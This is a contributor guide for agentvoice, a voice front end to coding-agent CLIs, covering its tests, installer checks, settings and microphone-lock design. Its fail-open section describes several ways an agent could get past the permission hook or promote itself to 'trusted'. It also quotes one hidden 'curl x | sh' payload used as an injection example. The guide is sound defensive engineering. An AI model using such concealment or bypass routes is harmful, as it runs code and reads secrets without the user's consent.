# Working on agentvoice

## Before every commit

```bash
./bin/agentvoice-check
```

Twelve static checks plus the test suite: two seconds for the checks, about
thirty with the tests. It exists because
this project shipped a string of bugs that reached the user first: an unbound
shell variable, a gum box rendered 298 columns wide, a Python method whose
body was orphaned into dead code after a `return`, and three settings that
were declared in the manifest, wired through the daemon, and never drawn in
the UI. Every one of those is the kind a second of automation catches.

## What earns a test

Add one when you touch:

- **`speech_text.py`** — sentence boundaries and markdown flattening. Every
  rule there exists because something sounded wrong when spoken aloud.
- **`permission_hook.py`** — a bug here fails open. Anything that changes how
  a decision is reached needs a case proving silence, corruption and malformed
  input all still deny.
- **`runtime.Config`** — precedence and reload. A value the daemon read once
  and never again has caused two separate "it does nothing" bugs.
- **`adapters/`** — the streaming contract, the cold-stub check, and the
  permission posture of each backend under `ask_permission` on and off.

Do not try to test the QML's behaviour, the audio loop, or anything needing a
microphone. Those are exercised by hand, and `agentvoice monitor` exists so a
wake word can be diagnosed with numbers rather than guesses. The QML's
*property references* are checked: `qmllint` catches a control bound to a name
that does not exist, which is how `suffix` versus `unit` shipped.

## Testing the installer on a machine that is not yours

```bash
AGENTVOICE_BOX=1 ./bin/agentvoice-check      # or bench/install-in-a-box.sh
```

Eight real installs under bubblewrap with an empty HOME, no shell.json, no
systemd user bus, a cold uv cache and named commands withheld. Opt-in, because
each one downloads about 100MB.

Every install bug this project has had hid behind something the development
machine already had: a configured widget, a systemd session, `gum`, `uv`, a warm
cache. A first install died silently after 700MB because `jq` exits 2 on a
missing shell.json; another reported `pkexec: command not found` and exit 127
when it could not bootstrap uv. Neither was reachable here. If you change
`install.sh`, run the box.

A pass there means the pieces are on disk afterwards, not that the exit status
was 0 -- an installer that returns 0 having done nothing is the same false green
as a skipped suite.

## Testing on a runner that has nothing installed

```bash
python3 -m venv /tmp/ci && /tmp/ci/bin/pip install -q -r requirements-dev.txt
AGENTVOICE_STRICT=1 AGENTVOICE_PYTHON=/tmp/ci/bin/python ./bin/agentvoice-check
```

That is the `check` job: pytest and nothing else, because the daemon imports
numpy, piper and onnxruntime lazily, inside the functions that use them, so
the suite runs in seconds without a machine-learning wheel. The development
machine has all of them, which makes it the wrong place to find out whether a
new test can run anywhere else. Three red builds have come from this -- a
test that skipped on every runner, a search that prompted because ripgrep was
absent, and three driven tests that needed numpy for `frame_db`.

The matching rule: **a test that cannot run on the bare runner must either
not need the dependency, or be honest that it is skipping.** Which of the two
depends on what the test is for. `importorskip` is right for the numeric
code -- test_barge and the verifier negatives measure numpy's own output, and
there is nothing to check without it. It was wrong for the frame loop, whose
whole purpose is to execute the path a parser cannot see: skipping it on CI
would have left the one check that cannot be fooled running only on a laptop.
So the RMS is reproduced in the standard library there and asserted equal to
`frame_db` wherever numpy exists, which the `full` job guarantees is
somewhere.

The second job, `full`, installs the real stack and sets
`AGENTVOICE_NO_SKIPS=1`, because on a runner with everything available a skip
is a test that was meant to run and did not. Both jobs have to pass, and they
fail for opposite reasons: `check` fails if a test needs a wheel, `full` fails
if a test ducks out.

## Settings are three things, not one

A new setting is not done until all three exist, and the check script enforces
the last two:

1. `manifest.json` → `barWidget.schema` and `barWidget.defaults`
2. `daemon/runtime.py` → `DEFAULTS`, and `TOML_ALIASES` if it belongs in the
   fallback config
3. `Settings.qml` → an actual control

Skipping step 3 gives a setting that works from `omarchy bar set` and is
invisible in the UI. That has happened.

## Anything a model loads is reconciled, not constructed once

`Pipeline.apply()` decides when to rebuild the wake engine, the transcription
model and the speaker. A new model-backed setting belongs in the spec it
compares, or changing it will silently do nothing until the service restarts.
Include a file mtime when the artifact can be rewritten underneath it — that
is why the verifier's mtime is in the wake spec.

Release what you replace. Dropping the reference is not enough: glibc keeps
the arena and RSS barely moves, so call `Pipeline._release()`, which also
runs `malloc_trim(0)`.

Four bugs of this shape shipped in one evening, so the rule is narrower than
"re-read your settings" -- an audit found all twenty-five settings reconciled
already. It is about values that live on a *constructed object*:

- a constructor argument belongs in the spec, because changing it means
  building the thing again: the wake model, the phrase, `useVerifier`;
- a plain attribute is assigned after the spec check, because rebuilding
  ~100MB for a number is waste: `owwThresholdPct`, the gate, the timings;
- anything read from a **file** is reconciled outside the config-changed
  guard, because a file changes with no setting change at all: the verifier's
  mtime, a Piper voice arriving, `vocab.txt`.

Get the first two the wrong way round and the setting either does nothing or
reloads a model on every poll. Miss the third and the fix waits for something
unrelated to be touched, which is how "switching engines and back" became
folklore for "make it notice".

## Six ways this fails open, and the rules that close them

Each of these was a real path from "somebody said something near the
microphone" to "something ran". They are listed because every one of them is
invisible in a passing test run.

**A hook that cannot answer is a hook that permitted it.** Claude Code treats
any exit from `permission_hook.py` other than 0-with-a-decision or 2 as a
*non-blocking* error: the tool proceeds. So a traceback there is not "the
guard broke", it is "the guard was absent". `main()` catches `BaseException`
and every path out of it emits a decision. The hook command is also
`shlex.quote`d, because it is run by a shell and a space in `$HOME` gives
exit 127, which fails open the same way.

**A path that does not exist yet still has to be judged.** `Path.exists()`
follows symlinks, so a *dangling* link counted as "not there" and only its
parent was resolved -- which put `notes.txt -> ~/.config/systemd/user/x.service`
inside the project. Use a plain non-strict `resolve()`, which follows what it
can and leaves the rest.

**"edits" is a statement about source files.** `paths.scope_root` returns
`None` rather than the home directory when no project is configured, because
home holds `shell.json`, which holds the permission level -- an agent that
could write it unasked could promote itself to "trusted". And inside a real
project, anything that *makes something else run* still asks:
`.claude/settings.json`, `.mcp.json`, `.envrc`, `.git/hooks/*`, a `.joblib`.
`NEVER_SILENT` is that list.

**A tool is judged by what it returns, not by what it was handed.**
`_paths_in` reads a tool's *arguments*, which describes a read exactly -- the
argument is the file -- and describes a search not at all: `Grep`'s arguments
are a pattern and a directory while its output is whatever lies beneath one.
So reading `credentials.json` asked and grepping the folder it sits in did
not, for the same bytes. Found by a marketplace reviewer against cba1abf,
after the adversarial review and 569 tests had both missed it. `CONTENT_SEARCH`
is the list of tools that hand back file contents they were never asked for by
name, and for those the check runs over what `rg --files` says the search
would actually read -- which applies .gitignore, so an ignored `.env` that
could never appear in results does not produce a prompt about nothing. Glob is
deliberately not on that list: it returns paths, and that a file exists is a
smaller thing than what is in it.

**Spoken text must not travel in argv.** `/proc/<pid>/cmdline` is mode 0444
with no hidepid on an ordinary Linux box, so anything passed as a command-line
argument is readable by every local account for as long as the process lives.
For a daemon whose input is whatever somebody said out loud, that is their
speech. Four adapters did it; `base.feed()` now hands the prompt over on stdin
and closes it, which is also what tells a CLI the prompt has ended. Per CLI
rather than in general, because a prompt written to a channel a CLI does not
read is a turn that hangs until the watchdog kills it: `claude -p` and `codex
exec` take it bare, `gemini` needs an empty `-p ""`, `agy` needs the
stream-json protocol because its `-p` eats the following flag, and of the ten
once on the shared adapter only `copilot` could be shown to accept it. The
other nine were removed rather than shipped leaking, because none would run
far enough to say where its prompt goes and a prompt sent down a channel a
CLI is not reading hangs the turn. That is the standing rule for this table:
a backend earns its place with one real turn, or it is not offered. The
endpoint adapter never had this: an HTTPS body is not argv.

**A transcript and a model reply are untrusted input to the UI.** Any `Text`
showing one needs `textFormat: Text.PlainText`: `AutoText` renders anything
that looks like HTML, and `ls <b></b><!-- ; curl x | sh -->` displays as `ls`
in the permission prompt. Anything printed goes through
`speech_text.safe_for_terminal` first, and anything becoming an argv element
through `as_prompt`.

And one shape rather than a rule: `omarchy-launch-floating-terminal-with-presentation`
takes a *command line*, not an argv -- it does `cmd="$*"` and runs
`bash -c "$cmd"`. Everything handed to it is shell source, so every argument
is quoted (`shq` in the QML), and a value read out of `shell.json` is checked
against the shape it should have before it gets that far.

## The microphone closes while the screen is locked

Not a setting. A locked machine that still answers a wake word undoes every
permission decision in this project by letting anyone walk up to the desk, so
there is nothing to switch off.

Two flags, and this is the part to get right: `Daemon.enabled` is what the
*user* asked for -- the panel switch, the panic keybind -- and `Daemon.locked`
is what the *session* is doing. Listening needs both (`Daemon.listening`).
Nothing is saved and restored around a lock, so there is no stored copy to
fall out of step, and unlocking cannot turn the microphone on for somebody
who had deliberately turned it off. Toggling `enabled` on lock would do
exactly that.

Three things have to happen on the way in, and each of them was a separate
leak:

- **the frames are dropped before anything measures them**, not after the
  wake word scores them;
- **a capture already underway is abandoned, not suspended.** Frames stop
  arriving either way, but `buf` keeps what was recorded up to the lock, so
  the utterance would resume on unlock joined to whatever was said next;
- **the HUD hides at once, with no linger.** It is a layer-shell surface, so
  it draws *over* the lock screen -- lingering leaves the last thing you said
  and the last thing the agent answered on a locked machine's display.

Detection is Omarchy's own `omarchy-hyprland-session-locked` rather than a
reimplementation, because the subtleties belong to whoever maintains it:
Hyprland reports no lock state directly, so it infers one from
`solitaryBlockedBy`, and that stays set once the lock's client has died. Its
exit 2 ("undetermined") becomes `None` here and the daemon keeps whatever it
last knew -- `false` is the fail-open answer and `true` would shut the
microphone for good on a machine with no compositor to ask, which is every
development run in a terminal. When nothing can answer at all, the daemon
*says so*: a fail-open nobody is told about is worse than either answer.

The 2s idle poll is the mechanism, because it needs nothing installed and
cannot be forgotten. `agentvoice lock` and `agentvoice unlock` exist for
binding to whatever locks the screen if that window matters; they are an
optimisation, not the guarantee.

To check it without locking yourself out: `agentvoice lock`, then
`agentvoice locked` and `agentvoice status`, then `agentvoice unlock`. To
check the real thing, lock the screen and read `journalctl --user -u
agentvoice -f`.

## A control with more than one way in needs one guard, not one each

Two bugs of this shape in one afternoon, both reported as "I can't turn it
on" with nothing on screen to explain it.

`toggleService` had three callers: the panel's switch, the bar icon's middle
click, and its right click. Hiding the switch when no engine is installed
looked like a fix and guarded one of the three. `toggleMic` had two, and the
bar's right click reached the Process directly, so it never checked that
`agentvoice` existed at all. The guard belongs in the function every entry
point must pass through, and a test asserts the caller count so that dropping
to one caller makes someone re-read the reasoning rather than quietly
loosening it.

The matching rule for the user: **a control that does nothing must say why.**
Silence cannot be told apart from a broken install, which leaves nothing to
act on. `note` exists for that, the panel draws it, and it clears itself when
the thing it complained about stops being true -- a message that outlives its
cause is its own bug. A spawn that never started is distinguishable from a
command that ran, because `onExited` is not emitted for the first; use
`running` going false, which is emitted for both.

And the two controls are not interchangeable. The switch stops the *service*,
which unloads ~600MB and costs three to four seconds to come back. Mute
releases the *microphone* and keeps everything warm. Someone who only knows
about the switch will use it as a mute and pay that price every time --
which is exactly what happened here, because mute was reachable only by a
right click and a keybind, and neither announces itself. Anything that
changes what the microphone is doing belongs somewhere a person can find it.

## What is pinned, and what is deliberately not

**Models are pinned and verified.** `models.lock` holds the piper-voices
revision and a sha256 for every file an install downloads; all three scripts
that fetch one read it, and `download()` refuses a file whose hash does not
match and a file with no hash at all. A voice absent from the lock is not
installable, so adding one to `Settings.qml` means adding it to the lock --
check 9 fails otherwise. Refresh with `./bench/pin-models.sh > models.lock`,
which costs one API call because the `.onnx` hashes come from Hugging Face's
own LFS metadata rather than from downloading a gigabyte of voices.

**Python dependencies are not pinned, and that is the open question.**
`requirements*.txt` give ranges, so six declared packages resolve to about
forty distributions at whatever version is newest that day. The protection a
lockfile with `--generate-hashes` would buy is real -- a compromised release
of any of those forty runs code at install time -- but the cost is the thing
`requirements.txt` was deliberately built to avoid: a pinned numpy against a
newer CPython is exactly the breakage that comment is about, and a lockfile
nobody refreshes rots into a worse state than a range.

**Deferred, on purpose:** work out a refresh routine first -- who regenerates
the lock, how often, and what tells you it has gone stale -- and only then
add the lock. A lockfile without that routine is a snapshot of one afternoon.

## A check that reads the code is not a check that the code ran

`logSpeech` is off by default, so the words somebody said are not written to
the journal -- the journal keeps entries for weeks, and "log the replies"
means keeping a transcript of everything the agent read out, including file
contents and key names. The structural lines are never gated: timings, wake
events, tool markers, lock transitions, errors. Nearly every bug here was
found from those rather than from the words.

The way that was *verified* is the part worth writing down, because it failed
twice in the same direction. The audit grepped for `print(` and looked for
content on that line; the completed-transcript print wraps, and its first
physical line holds a carriage return and 120 spaces and nothing else. Then
journalctl renders a line containing a `\r` as `[214B blob data]`, so reading
the journal for leaked speech also found none. Two independent checks, both
clean, and the transcript had been going to the journal the whole time. A
reviewer found it by opening the file.

So, in order of how much they are worth:

- **run it and look at the output.** The frame loop is driven in
  `test_states.py` by putting a fake `sounddevice` in `sys.modules` -- the
  import is inside `run()` -- whose stream delivers frames from its own
  thread the way PortAudio does. Real frame sizes, real `frame_db`, real
  endpointing. It reads *both* streams, because systemd journals stderr too.
- **parse it, never grep it.** The audit is an AST walk and matches on every
  identifier a `print` reads, at any depth. Matching on the presence of
  `safe_for_terminal` in the source was worse than it looked: it only fired
  when a second rule was already being kept, so a print interpolating a raw
  transcript would have passed by being wrong twice.
- **mutate it.** A test that has never failed is a guess. Reintroduce the
  leak and watch the test go red -- all three of the gate's mutations are
  caught, and the identifier-based audit catches one the substring version
  passed.

And when checking the journal by hand, `journalctl -o json`: the default
renderer hides exactly the lines most likely to carry speech, because a
progress line rewrites itself with a carriage return.

## Claims in the README and in commits

Measure before asserting. `bench/FINDINGS.md` records what was measured, on
what hardware, with the numbers. If a claim there turns out to be wrong,
correct it in place rather than leaving two versions of the truth — the
Voxtype-transcription architecture and the "31% of one core" figure were both
wrong, and both are now written down as corrections with the reasoning.

Say which backends have actually answered a turn. Claude Code, Codex,
Gemini, Antigravity and Copilot have, and nothing else is offered. Watching a single
live turn falsified three things Gemini's adapter believed -- where the CLI
records its auth, that a headless run needs no trusted folder, and that
everything on stdout was speech -- and nothing in Codex's. Flags read off
`--help` are a hypothesis, not a contract; record what a real turn emitted,
and replay it in a test so a schema change fails loudly rather than going
quiet.
